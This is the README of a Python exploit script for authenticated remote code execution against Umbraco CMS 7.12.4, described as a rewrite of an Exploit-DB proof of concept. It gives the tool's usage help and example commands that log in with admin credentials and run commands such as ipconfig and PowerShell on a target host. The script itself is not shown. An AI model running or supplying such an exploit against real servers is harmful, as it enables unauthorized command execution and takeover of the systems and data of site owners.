# Umbraco RCE exploit / PoC

> Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution

## Usage

```
$ python exploit.py -h
usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]

Umbraco authenticated RCE

optional arguments:
  -h, --help                 show this help message and exit
  -u USER, --user USER       username / email
  -p PASS, --password PASS   password
  -i URL, --host URL         root URL
  -c CMD, --command CMD      command
  -a ARGS, --arguments ARGS  arguments
```

Examples:

```
$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'
```

## Reference

This is a better re-write of [EDB-ID-46153](https://www.exploit-db.com/exploits/46153) using arguments and with stdout display.

Tested with python 3.8.
